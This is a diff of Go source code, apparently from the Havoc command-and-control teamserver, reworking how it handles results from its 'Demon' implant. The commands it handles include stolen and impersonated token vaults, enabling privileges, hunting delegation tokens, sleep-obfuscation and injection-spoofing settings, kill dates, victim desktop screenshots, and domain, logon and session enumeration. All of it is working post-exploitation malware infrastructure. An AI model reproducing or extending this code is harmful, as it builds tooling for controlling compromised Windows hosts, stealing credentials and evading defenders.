-					Array = append(Array, []any{TokenIndex, Handle, DomainAndUser, ProcessID, Type})
+					Array = append(Array, []any{TokenIndex, Handle, DomainAndUser, ProcessID, Type, Impersonating})
 
 					if len(DomainAndUser) > MaxString {
 						MaxString = len(DomainAndUser)
 					}
 				}
 
-				FmtString = fmt.Sprintf(" %%-4v  %%-6v  %%-%vv  %%-4v  %%-4v\n", MaxString)
+				FmtString = fmt.Sprintf(" %%-4v  %%-6v  %%-%vv  %%-4v  %%-14v %%-4v\n", MaxString)
 
-				Buffer += fmt.Sprintf(FmtString, " ID ", "Handle", "Domain\\User", "PID", "Type")
-				Buffer += fmt.Sprintf(FmtString, "----", "------", "-----------", "---", "----")
+				Buffer += fmt.Sprintf(FmtString, " ID ", "Handle", "Domain\\User", "PID", "Type","Impersonating")
+				Buffer += fmt.Sprintf(FmtString, "----", "------", "-----------", "---", "--------------","-------------")
 
 				for _, item := range Array {
-
-					logger.Debug(fmt.Sprintf("item[4]: %v", item[4]))
 
 					if item[4] == 0x1 {
 						item[4] = "stolen"
@@ -3159,24 +4067,34 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver Te
 						item[4] = "unknown"
 					}
 
-					Buffer += fmt.Sprintf(FmtString, item[0], item[1], item[2], item[3], item[4])
+					if item[5] == win32.TRUE {
+						item[5] = "Yes"
+					} else {
+						item[5] = "No"
+					}
+
+					Buffer += fmt.Sprintf(FmtString, item[0], item[1], item[2], item[3], item[4], item[5])
 				}
 
 				Output["Type"] = "Info"
 				Output["Message"] = "Token Vault:"
 				Output["Output"] = "\n" + Buffer
+				a.RequestCompleted(RequestID)
 
 				break
 
-			case 0x4: // privs get or list
-				var (
-					PrivList     = Parser.ParseInt32()
-					OutputBuffer bytes.Buffer
-					TableData    [][]string
-				)
+			case DEMON_COMMAND_TOKEN_PRIVSGET_OR_LIST:
 
-				if PrivList == win32.TRUE {
-					if Parser.Length() > 0 {
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_PRIVSGET_OR_LIST", AgentID))
+
+					var (
+						PrivList     = Parser.ParseInt32()
+						OutputBuffer bytes.Buffer
+						TableData    [][]string
+					)
+
+					if PrivList == win32.TRUE {
 
 						table := tablewriter.NewWriter(&OutputBuffer)
 
@@ -3187,7 +4105,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver Te
 						table.SetColumnSeparator("::")
 						table.SetCenterSeparator(" ")
 
-						for Parser.Length() != 0 {
+						for Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadInt32}) {
 							var (
 								Column    []string
 								Privilege string
@@ -3195,7 +4113,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver Te
 								State     string
 							)
 
-							Privilege = string(Parser.ParseBytes())
+							Privilege = Parser.ParseString()
 							StateInt = Parser.ParseInt32()
 
 							if StateInt == 3 {
@@ -3218,171 +4136,387 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver Te
 						Output["Message"] = "List Privileges for current Token:"
 						Output["Output"] = "\n" + OutputBuffer.String()
 					} else {
-						Output["Type"] = "Error"
-						Output["Message"] = "Failed to list privileges current token"
+
+						if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadBytes}) {
+							var (
+								Success  = Parser.ParseInt32()
+								PrivName = Parser.ParseString()
+							)
+
+							if Success == 1 {
+								Output["Type"] = "Good"
+								Output["Message"] = fmt.Sprintf("The privilege %s was successfully enabled", PrivName)
+							} else {
+								Output["Type"] = "Error"
+								Output["Message"] = fmt.Sprintf("Failed to enable the %s privilege", PrivName)
+							}
+
+						} else {
+							logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_PRIVSGET_OR_LIST, Invalid packet", AgentID))
+						}
 					}
+					a.RequestCompleted(RequestID)
 				} else {
-					// TODO: finish this
-					if Parser.Length() > 0 {
-						Output["Type"] = "Good"
-						Output["Message"] = "Get Privilege for current Token:"
-					} else {
-						Output["Type"] = "Error"
-						Output["Message"] = "Failed to get privilege current token"
-					}
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_PRIVSGET_OR_LIST, Invalid packet", AgentID))
 				}
+
 				break
 
-			case 0x5: // make
-				if Parser.Length() > 0 {
+			case DEMON_COMMAND_TOKEN_MAKE:
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_MAKE", AgentID))
+				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
 					Output["Type"] = "Good"
-					Output["Message"] = fmt.Sprintf("Successful created token: " + string(Parser.ParseBytes()))
+					Output["Message"] = fmt.Sprintf("Successfully created and impersonated token: %s", Parser.ParseUTF16String())
 				} else {
 					Output["Type"] = "Error"
 					Output["Message"] = fmt.Sprintf("Failed to create token")
 				}
+				a.RequestCompleted(RequestID)
 				break
 
-			case 0x6: // getuid
+			case DEMON_COMMAND_TOKEN_GET_UID:
+
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadBytes}) {
+					var (
+						Elevated = Parser.ParseInt32()
+						User     = Parser.ParseString()
+					)
+
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_GET_UID, Elevated: %d, User: %v", AgentID, Elevated, User))
+
+					Output["Type"] = typeGood
+					if Elevated == 0 {
+						Output["Message"] = fmt.Sprintf("Token User: %v", User)
+					} else {
+						Output["Message"] = fmt.Sprintf("Token User: %v (Admin)", User)
+					}
+					a.RequestCompleted(RequestID)
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_GET_UID, Invalid packet", AgentID))
+				}
+
+				break
+
+			case DEMON_COMMAND_TOKEN_REVERT:
+
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+					var Successful = Parser.ParseInt32()
+
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_REVERT, Successful: %d", AgentID, Successful))
+
+					if Successful == win32.TRUE {
+						Output["Type"] = typeGood
+						Output["Message"] = "Successful reverted token to itself"
+					} else {
+						Output["Type"] = typeError
+						Output["Message"] = "Failed to revert token to itself"
+					}
+					a.RequestCompleted(RequestID)
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_REVERT, Invalid packet", AgentID))
+				}
+
+				break
+
+			case DEMON_COMMAND_TOKEN_REMOVE:
+
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
+					var (
+						Successful = Parser.ParseInt32()
+						TokenID    = Parser.ParseInt32()
+					)
+
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_REMOVE, Successful: %d, TokenID: %v", AgentID, Successful, TokenID))
+
+					if Successful == win32.TRUE {
+						Output["Type"] = typeGood
+						Output["Message"] = fmt.Sprintf("Successful removed token [%v] from vault", TokenID)
+					} else {
+						Output["Type"] = typeError
+						Output["Message"] = fmt.Sprintf("Failed to remove token [%v] from vault", TokenID)
+					}
+					a.RequestCompleted(RequestID)
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_REMOVE, Invalid packet", AgentID))
+				}
+
+				break
+
+			case DEMON_COMMAND_TOKEN_FIND_TOKENS:
+
 				var (
-					Elevated = Parser.ParseInt32()
-					User     = string(Parser.ParseBytes())
+					Successful    int
+					Buffer        string
+					DomainAndUser string
+					NumDelTokens  int
+					NumImpTokens  int
+					ProcessPID    int
+					localHandle   int
 				)
 
-				Output["Type"] = typeGood
-				if Elevated == 0 {
-					Output["Message"] = fmt.Sprintf("Token User: %v", User)
-				} else {
-					Output["Message"] = fmt.Sprintf("Token User: %v (Admin)", User)
-				}
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
 
-				break
-
-			case 0x7: // revert
-				var Successful = Parser.ParseInt32()
-
-				if Successful == win32.TRUE {
-					Output["Type"] = typeGood
-					Output["Message"] = "Successful reverted token to itself"
-				} else {
-					Output["Type"] = typeError
-					Output["Message"] = "Failed to revert token to itself"
-				}
-
-				break
-
-			case 0x8: // remove
-				var (
 					Successful = Parser.ParseInt32()
-					TokenID    = Parser.ParseInt32()
-				)
 
-				if Successful == win32.TRUE {
-					Output["Type"] = typeGood
-					Output["Message"] = fmt.Sprintf("Successful removed token [%v] from vault", TokenID)
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_FIND_TOKENS, Successful: %d", AgentID, Successful))
+
+					if Successful  == win32.TRUE {
+
+						Buffer += "Delegation Tokens Available\n"
+						Buffer += "========================================\n"
+
+						if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+
+							NumDelTokens = Parser.ParseInt32()
+
+							if NumDelTokens == 0 {
+								Buffer += "(No tokens found)\n"
+							} else {
+								for NumDelTokens > 0 && Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadInt32, parser.ReadInt32}) {
+									DomainAndUser = Parser.ParseString()
+									ProcessPID    = Parser.ParseInt32()
+									localHandle   = Parser.ParseInt32()
+									if localHandle != 0 {
+										Buffer += fmt.Sprintf("- User: %s, Process: %d, handle: %x\n", DomainAndUser, ProcessPID, localHandle )
+									} else {
+										Buffer += fmt.Sprintf("- User: %s, Process: %d\n", DomainAndUser, ProcessPID )
+									}
+									NumDelTokens--
+								}
+							}
+
+							Buffer += "\nImpersonation Tokens Available\n"
+							Buffer += "========================================\n"
+
+							if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+
+								NumImpTokens = Parser.ParseInt32()
+
+								if NumImpTokens == 0 {
+									Buffer += "(No tokens found)\n"
+								} else {
+									for NumImpTokens > 0 && Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadInt32, parser.ReadInt32}) {
+										DomainAndUser = Parser.ParseString()
+										ProcessPID    = Parser.ParseInt32()
+										localHandle   = Parser.ParseInt32()
+										if localHandle != 0 {
+											Buffer += fmt.Sprintf("- User: %s, Process: %d, handle: %x\n", DomainAndUser, ProcessPID, localHandle )
+										} else {
+											Buffer += fmt.Sprintf("- User: %s, Process: %d\n", DomainAndUser, ProcessPID )
+										}
+										NumImpTokens--
+									}
+								}
+
+								Output["Type"] = "Info"
+								Output["Message"] = "Tokens available:"
+								Output["Output"] = "\n" + Buffer
+								a.RequestCompleted(RequestID)
+							} else {
+								logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_FIND_TOKENS, Invalid packet: %d", AgentID))
+							}
+
+						} else {
+							logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_FIND_TOKENS, Invalid packet: %d", AgentID))
+						}
+
+					} else {
+						Output["Type"] = typeError
+						Output["Message"] = "Failed to list existing tokens"
+					}
 				} else {
-					Output["Type"] = typeError
-					Output["Message"] = fmt.Sprintf("Failed to remove token [%v] from vault", TokenID)
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_FIND_TOKENS, Invalid packet", AgentID))
 				}
 
 				break
 
-			case 0x9: // clear
-
+			case DEMON_COMMAND_TOKEN_CLEAR:
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_CLEAR", AgentID))
 				Output["Type"] = typeGood
 				Output["Message"] = "Token vault has been cleared"
-
+				a.RequestCompleted(RequestID)
 				break
+
+			default:
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - UNKNOWN (%d)", AgentID, SubCommand))
 			}
 
 			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
+		} else {
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN, Invalid packet", AgentID))
 		}
+
 		break
 
 	case COMMAND_CONFIG:
-		var (
-			Message = make(map[string]string)
 
-			Config     int
-			ConfigData any
-		)
+		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+			var (
+				Message = make(map[string]string)
 
-		Config = Parser.ParseInt32()
-		Message["Type"] = "Good"
+				Config     int
+				ConfigData any
+			)
 
-		if Parser.Length() >= 4 {
+			Config = Parser.ParseInt32()
+			Message["Type"] = "Good"
+
 			switch Config {
 
 			case CONFIG_MEMORY_ALLOC:
-				ConfigData = Parser.ParseInt32()
-				Message["Message"] = fmt.Sprintf("Default memory allocation set to %v", ConfigData.(int))
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_MEMORY_ALLOC", AgentID))
+					ConfigData = Parser.ParseInt32()
+					Message["Message"] = fmt.Sprintf("Default memory allocation set to %v", ConfigData.(int))
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_MEMORY_ALLOC, Invalid packet", AgentID))
+				}
 				break
 
 			case CONFIG_MEMORY_EXECUTE:
-				ConfigData = Parser.ParseInt32()
-				Message["Message"] = fmt.Sprintf("Default memory executing set to %v", ConfigData.(int))
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_MEMORY_EXECUTE", AgentID))
+					ConfigData = Parser.ParseInt32()
+					Message["Message"] = fmt.Sprintf("Default memory executing set to %v", ConfigData.(int))
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_MEMORY_EXECUTE, Invalid packet", AgentID))
+				}
 				break
 
 			case CONFIG_INJECT_SPAWN64:
-				ConfigData = string(Parser.ParseBytes())
-				Message["Message"] = "Default x64 target process set to " + ConfigData.(string)
+				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_INJECT_SPAWN64", AgentID))
+					ConfigData = Parser.ParseUTF16String()
+					Message["Message"] = "Default x64 target process set to " + ConfigData.(string)
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_INJECT_SPAWN64, Invalid packet", AgentID))
+				}
 				break
 
 			case CONFIG_INJECT_SPAWN32:
-				ConfigData = string(Parser.ParseBytes())
-				Message["Message"] = "Default x86 target process set to " + ConfigData.(string)
+				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_INJECT_SPAWN32", AgentID))
+					ConfigData = Parser.ParseUTF16String()
+					Message["Message"] = "Default x86 target process set to " + ConfigData.(string)
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_INJECT_SPAWN32, Invalid packet", AgentID))
+				}
+				break
+
+			case CONFIG_KILLDATE:
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt64}) {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_KILLDATE", AgentID))
+					a.Info.KillDate = Parser.ParseInt64()
+					teamserver.AgentUpdate(a)
+					if a.Info.KillDate == 0 {
+						Message["Message"] = "KillDate was disabled"
+					} else {
+						Message["Message"] = "KillDate has been set"
+					}
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_KILLDATE, Invalid packet", AgentID))
+				}
+				break
+
+			case CONFIG_WORKINGHOURS:
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_WORKINGHOURS", AgentID))
+					a.Info.WorkingHours = int32(Parser.ParseInt32())
+					teamserver.AgentUpdate(a)
+					if a.Info.WorkingHours == 0 {
+						Message["Message"] = "WorkingHours was disabled"
+					} else {
+						Message["Message"] = "WorkingHours has been set"
+					}
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_KILLDATE, Invalid packet", AgentID))
+				}
 				break
 
 			case CONFIG_IMPLANT_SPFTHREADSTART:
-				ConfigData = string(Parser.ParseBytes()) + "!" + string(Parser.ParseBytes())
-				Message["Message"] = "Sleep obfuscation spoof thread start addr to " + ConfigData.(string)
+				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadBytes}) {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_IMPLANT_SPFTHREADSTART", AgentID))
+					ConfigData = Parser.ParseString() + "!" + Parser.ParseString()
+					Message["Message"] = "Sleep obfuscation spoof thread start addr to " + ConfigData.(string)
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_IMPLANT_SPFTHREADSTART, Invalid packet", AgentID))
+				}
 				break
 
 			case CONFIG_IMPLANT_SLEEP_TECHNIQUE:
-				ConfigData = Parser.ParseInt32()
-				Message["Message"] = fmt.Sprintf("Sleep obfuscation technique set to %v", ConfigData.(int))
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_IMPLANT_SLEEP_TECHNIQUE", AgentID))
+					ConfigData = Parser.ParseInt32()
+					Message["Message"] = fmt.Sprintf("Sleep obfuscation technique set to %v", ConfigData.(int))
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_IMPLANT_SLEEP_TECHNIQUE, Invalid packet", AgentID))
+				}
 				break
 
 			case CONFIG_IMPLANT_COFFEE_VEH:
-				ConfigData = Parser.ParseInt32()
-				if ConfigData.(int) == 0 {
-					ConfigData = "false"
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_IMPLANT_COFFEE_VEH", AgentID))
+					ConfigData = Parser.ParseInt32()
+					if ConfigData.(int) == 0 {
+						ConfigData = "false"
+					} else {
+						ConfigData = "true"
+					}
+					Message["Message"] = fmt.Sprintf("Coffee VEH set to %v", ConfigData.(string))
 				} else {
-					ConfigData = "true"
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_IMPLANT_COFFEE_VEH, Invalid packet", AgentID))
 				}
-				Message["Message"] = fmt.Sprintf("Coffee VEH set to %v", ConfigData.(string))
 				break
 
 			case CONFIG_IMPLANT_COFFEE_THREADED:
-				ConfigData = Parser.ParseInt32()
-				if ConfigData.(int) == 0 {
-					ConfigData = "false"
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_IMPLANT_COFFEE_THREADED", AgentID))
+					ConfigData = Parser.ParseInt32()
+					if ConfigData.(int) == 0 {
+						ConfigData = "false"
+					} else {
+						ConfigData = "true"
+					}
+					Message["Message"] = fmt.Sprintf("Coffee threading set to %v", ConfigData.(string))
 				} else {
-					ConfigData = "true"
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_IMPLANT_COFFEE_THREADED, Invalid packet", AgentID))
 				}
-				Message["Message"] = fmt.Sprintf("Coffee threading set to %v", ConfigData.(string))
 				break
 
 			case CONFIG_INJECT_TECHNIQUE:
-				ConfigData = strconv.Itoa(Parser.ParseInt32())
-				Message["Message"] = "Set default injection technique to " + ConfigData.(string)
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_INJECT_TECHNIQUE", AgentID))
+					ConfigData = strconv.Itoa(Parser.ParseInt32())
+					Message["Message"] = "Set default injection technique to " + ConfigData.(string)
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_INJECT_TECHNIQUE, Invalid packet", AgentID))
+				}
 				break
 
 			case CONFIG_INJECT_SPOOFADDR:
-				ConfigData = string(Parser.ParseBytes()) + "!" + string(Parser.ParseBytes())
-				Message["Message"] = "Injection thread spoofing value set to " + ConfigData.(string)
+				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadBytes}) {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_INJECT_SPOOFADDR", AgentID))
+					ConfigData = Parser.ParseString() + "!" + Parser.ParseString()
+					Message["Message"] = "Injection thread spoofing value set to " + ConfigData.(string)
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_INJECT_SPOOFADDR, Invalid packet", AgentID))
+				}
 				break
 
 			case CONFIG_IMPLANT_VERBOSE:
-				ConfigData = Parser.ParseInt32()
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_IMPLANT_VERBOSE", AgentID))
+					ConfigData = Parser.ParseInt32()
 
-				if ConfigData.(int) == 0 {
-					ConfigData = "false"
+					if ConfigData.(int) == 0 {
+						ConfigData = "false"
+					} else {
+						ConfigData = "true"
+					}
+					Message["Message"] = fmt.Sprintf("Implant verbose messaging: %v", ConfigData.(string))
 				} else {
-					ConfigData = "true"
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_IMPLANT_VERBOSE, Invalid packet", AgentID))
 				}
-
-				Message["Message"] = fmt.Sprintf("Implant verbose messaging: %v", ConfigData.(string))
 				break
 
 			default:
@@ -3390,642 +4524,763 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver Te
 				Message["Message"] = "Error while setting certain config"
 				break
 			}
-		} else {
-			Message["Type"] = "Error"
-			Message["Message"] = "Error while setting certain config"
-		}
 
-		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+			a.RequestCompleted(RequestID)
+		} else {
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG, Invalid packet", AgentID))
+		}
 
 		break
 
 	case COMMAND_SCREENSHOT:
-		var (
-			Success = Parser.ParseInt32()
-			Message = make(map[string]string)
-		)
+		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
+			var (
+				Success = Parser.ParseInt32()
+				Message = make(map[string]string)
+			)
 
-		if Success == 1 {
-			var BmpBytes = Parser.ParseBytes()
-			var Name = "Desktop_" + time.Now().Format("02.01.2006-05.04.05") + ".png"
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SCREENSHOT, Success: %d", AgentID, Success))
 
-			if len(BmpBytes) > 0 {
-				err := logr.LogrInstance.DemonSaveScreenshot(a.NameID, Name, BmpBytes)
-				if err != nil {
-					Message["Type"] = "Error"
-					Message["Message"] = "Failed to take a screenshot: " + err.Error()
-					return
+			if Success == 1 {
+				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
+					var BmpBytes = Parser.ParseBytes()
+					var Name = "Desktop_" + time.Now().Format("02.01.2006-05.04.05") + ".png"
+
+					if len(BmpBytes) > 0 {
+						err := logr.LogrInstance.DemonSaveScreenshot(a.NameID, Name, BmpBytes)
+						if err != nil {
+							Message["Type"] = "Error"
+							Message["Message"] = "Failed to take a screenshot: " + err.Error()
+							return
+						}
+
+						Message["Type"] = "Good"
+						Message["Message"] = "Successful took screenshot"
+
+						Message["MiscType"] = "screenshot"
+						Message["MiscData"] = base64.StdEncoding.EncodeToString(BmpBytes)
+						Message["MiscData2"] = Name
+					} else {
+						Message["Type"] = "Error"
+						Message["Message"] = "Failed to take a screenshot"
+					}
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SCREENSHOT, Invalid packet", AgentID))
 				}
-
-				Message["Type"] = "Good"
-				Message["Message"] = "Successful took screenshot"
-
-				Message["MiscType"] = "screenshot"
-				Message["MiscData"] = base64.StdEncoding.EncodeToString(BmpBytes)
-				Message["MiscData2"] = Name
 			} else {
 				Message["Type"] = "Error"
 				Message["Message"] = "Failed to take a screenshot"
 			}
-		} else {
-			Message["Type"] = "Error"
-			Message["Message"] = "Failed to take a screenshot"
-		}
 
-		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+			a.RequestCompleted(RequestID)
+		} else {
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SCREENSHOT, Invalid packet", AgentID))
+		}
 
 		break
 
 	case COMMAND_NET:
-		var (
-			NetCommand = Parser.ParseInt32()
-			Message    = make(map[string]string)
-		)
-
-		switch NetCommand {
-
-		case DEMON_NET_COMMAND_DOMAIN:
-			var Domain = string(Parser.ParseBytes())
-			Message["Type"] = "Good"
-			Message["Message"] = "Domain for this Host: " + Domain
-			break
-
-		case DEMON_NET_COMMAND_LOGONS:
+		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
 			var (
-				Index  int
-				Output string
+				NetCommand = Parser.ParseInt32()
+				Message    = make(map[string]string)
 			)
 
-			if Parser.Length() > 0 {
-				var Domain = string(Parser.ParseBytes())
-				Output += fmt.Sprintf(" %-12s\n", "Usernames")
-				Output += fmt.Sprintf(" %-12s\n", "---------")
-				for Parser.Length() != 0 {
-					var Name = string(Parser.ParseBytes())
+			switch NetCommand {
 
-					Index++
+			case DEMON_NET_COMMAND_DOMAIN:
+				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
+					var Domain = Parser.ParseString()
 
-					Output += fmt.Sprintf("  %-12s\n", Name)
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_NET - DEMON_NET_COMMAND_DOMAIN, Domain: %s", AgentID, Domain))
+
+					if Domain == "" {
+						Message["Type"] = "Good"
+						Message["Message"] = "The machine does not seem to be joined to a domain"
+					} else {
+						Message["Type"] = "Good"
+						Message["Message"] = fmt.Sprintf("Domain for this Host: %s", Domain)
+					}
+					a.RequestCompleted(RequestID)
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_NET - DEMON_NET_COMMAND_DOMAIN, Invalid packet", AgentID))
+				}
+				break
+
+			case DEMON_NET_COMMAND_LOGONS:
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_NET - DEMON_NET_COMMAND_LOGONS", AgentID))
+				var (
+					Index  int
+					Output string
+				)
+
+				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
+					var Domain = Parser.ParseUTF16String()
+					Output += fmt.Sprintf(" %-12s\n", "Usernames")
+					Output += fmt.Sprintf(" %-12s\n", "---------")
+					for Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
+						var Name = Parser.ParseUTF16String()
+
+						Index++
+
+						Output += fmt.Sprintf("  %-12s\n", Name)
+					}
+
+					Message["Type"] = "Info"
+					Message["Message"] = fmt.Sprintf("Logged on users at %s [%v]: ", Domain, Index)
+					Message["Output"] = "\n" + Output
+					a.RequestCompleted(RequestID)
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_NET - DEMON_NET_COMMAND_LOGONS, Invalid packet", AgentID))
 				}
 
-				Message["Type"] = "Info"
-				Message["Message"] = fmt.Sprintf("Logged on users at %v [%v]: ", Domain, Index)
-				Message["Output"] = "\n" + Output
-			}
+				break
 
-			break
+			case DEMON_NET_COMMAND_SESSIONS:
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_NET - DEMON_NET_COMMAND_SESSIONS", AgentID))
+				var (
+					Index  int
+					Buffer bytes.Buffer
+					Data   [][]string
+				)
 
-		case DEMON_NET_COMMAND_SESSIONS:
-			var (
-				Index  int
-				Buffer bytes.Buffer
-				Data   [][]string
-			)
+				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
+					var Domain = Parser.ParseUTF16String()
 
-			if Parser.Length() > 0 {
-				var Domain = string(Parser.ParseBytes())
+					table := tablewriter.NewWriter(&Buffer)
 
-				table := tablewriter.NewWriter(&Buffer)
+					table.SetBorder(false)
+					table.SetHeader([]string{"Computer", "Username", "Active", "Idle"})
+					table.SetBorder(false)
+					table.SetHeaderAlignment(tablewriter.ALIGN_CENTER)
 
-				table.SetBorder(false)
-				table.SetHeader([]string{"Computer", "Username", "Active", "Idle"})
-				table.SetBorder(false)
-				table.SetHeaderAlignment(tablewriter.ALIGN_CENTER)
+					// table.SetRowSeparator("-")
+					table.SetColumnSeparator(" ")
+					table.SetCenterSeparator(" ")
 
-				// table.SetRowSeparator("-")
-				table.SetColumnSeparator(" ")
-				table.SetCenterSeparator(" ")
+					for Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadBytes, parser.ReadInt32, parser.ReadInt32}) {
+						var (
+							Client = Parser.ParseUTF16String()
+							User   = Parser.ParseUTF16String()
+							Time   = int(Parser.ParseInt32())
+							Idle   = int(Parser.ParseInt32())
+							Column []string
+						)
 
-				for Parser.Length() != 0 {
-					var (
-						Client = string(Parser.ParseBytes())
